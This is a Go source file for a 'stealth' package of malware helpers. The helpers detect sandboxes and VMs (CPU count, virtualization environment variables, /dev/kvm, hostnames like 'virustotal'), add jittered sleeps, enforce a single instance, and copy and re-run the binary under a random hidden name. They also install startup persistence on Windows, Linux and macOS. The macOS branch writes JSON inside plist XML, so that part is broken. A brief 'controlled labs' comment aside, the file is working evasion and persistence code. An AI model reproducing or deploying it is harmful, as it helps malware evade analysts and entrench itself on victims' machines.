// Package stealth implements light-weight evasion / anti-analysis helpers.
// These reduce the static and behavioral footprint of the payload in
// controlled labs. They are NOT a substitute for product-specific bypasses.
package stealth

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// LooksLikeAnalysisEnv performs cheap heuristic checks for sandboxes / VMs
// (low CPU count, virtualization markers, container envs). Returns the list
// of triggered indicators (empty = looks clean).
func LooksLikeAnalysisEnv() []string {
	var hits []string
	if runtime.NumCPU() <= 2 {
		hits = append(hits, "low-cpu")
	}
	envPairs := map[string]string{
		"VIRTUALBOX":   "virtualbox-env",
		"VMWARE":       "vmware-env",
		"KUBERNETES":   "k8s-env",
		"CONTAINER":    "container-env",
		"DEADBYTE_DBG": "debug-env",
		"CI":           "ci-env",
	}
	for k, v := range envPairs {
		if os.Getenv(k) != "" {
			hits = append(hits, v)
		}
	}
	if runtime.GOOS == "linux" {
		if _, err := os.Stat("/dev/kvm"); err == nil {
			hits = append(hits, "kvm-present")
		}
	}
	hn := strings.ToLower(os.Getenv("HOSTNAME"))
	for _, pat := range []string{"sandbox", "malware", "virustotal", "sample", "test-vm", "win-"} {
		if strings.Contains(hn, pat) {
			hits = append(hits, "hostname-"+pat)
			break
		}
	}
	return hits
}

// Jitter returns d +/- pct%.
func Jitter(d time.Duration, pct float64) time.Duration {
	if pct <= 0 {
		return d
	}
	delta := time.Duration(float64(d) * pct / 100)
	if delta <= 0 {
		return d
	}
	return d + time.Duration(rand.Int63n(int64(delta)*2)) - delta
}

// SleepJittered sleeps for d with jitter, honoring an early-exit channel.
func SleepJittered(d time.Duration, pct float64, stop <-chan struct{}) bool {
	t := time.NewTimer(Jitter(d, pct))
	defer t.Stop()
	select {
	case <-t.C:
		return true
	case <-stop:
		return false
	}
}

// SingleInstance acquires a lock file so only one payload runs per host.
func SingleInstance(tag string) (func(), error) {
	name := filepath.Join(os.TempDir(), "."+tag+".lock")
	f, err := os.OpenFile(name, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o600)
	if err != nil {
		return nil, fmt.Errorf("stealth: another instance is running (%v)", err)
	}
	fmt.Fprintf(f, "%d\n", os.Getpid())
	f.Close()
	return func() { os.Remove(name) }, nil
}

// SpoofSelf copies the running executable to a random name in the temp dir
// and re-executes it there (dropping the original name). Returns true when
// the caller should exit (the child is now running). envKey marks the child.
func SpoofSelf(envKey string) (bool, error) {
	if os.Getenv(envKey) == "1" {
		return false, nil // already the spoofed child
	}
	self, err := os.Executable()
	if err != nil {
		return false, err
	}
	dest := filepath.Join(os.TempDir(), fmt.Sprintf(".%s-%d", randString(6), os.Getpid()))
	if runtime.GOOS == "windows" {
		dest += ".exe"
	}
	data, err := os.ReadFile(self)
	if err != nil {
		return false, err
	}
	if err := os.WriteFile(dest, data, 0o755); err != nil {
		return false, err
	}
	cmd := exec.Command(dest, os.Args[1:]...)
	cmd.Env = append(os.Environ(), envKey+"=1")
	if err := cmd.Start(); err != nil {
		os.Remove(dest)
		return false, err
	}
	cmd.Process.Release()
	return true, nil
}

// Persist installs startup persistence for the current binary (per-OS).
// Returns the persistence artifact path.
func Persist(tag string) (string, error) {
	self, err := os.Executable()
	if err != nil {
		return "", err
	}
	switch runtime.GOOS {
	case "windows":
		appData, err := os.UserConfigDir()
		if err != nil {
			return "", err
		}
		dir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		if _, err := os.Stat(dir); err != nil {
			return "", err
		}
		dest := filepath.Join(dir, tag+".exe")
		return dest, copyFile(self, dest)
	case "linux":
		dir := filepath.Join(os.Getenv("HOME"), ".config", "autostart")
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return "", err
		}
		dest := filepath.Join(dir, tag+".desktop")
		content := "[Desktop Entry]\nType=Application\nName=" + tag + "\nExec=" + self + "\nX-GNOME-Autostart-enabled=true\n"
		return dest, os.WriteFile(dest, []byte(content), 0o600)
	case "darwin":
		dir := filepath.Join(os.Getenv("HOME"), "Library", "LaunchAgents")
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return "", err
		}
		dest := filepath.Join(dir, "com."+tag+".plist")
		pl := map[string]any{
			"Label":            "com." + tag,
			"ProgramArguments": []string{self},
			"RunAtLoad":        true,
			"KeepAlive":        false,
		}
		b, _ := json.MarshalIndent(pl, "", "  ")
		xml := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n" + string(b) + "\n</plist>\n"
		return dest, os.WriteFile(dest, []byte(xml), 0o600)
	}
	return "", fmt.Errorf("stealth: persistence not supported on %s", runtime.GOOS)
}

func randString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0o755)
}
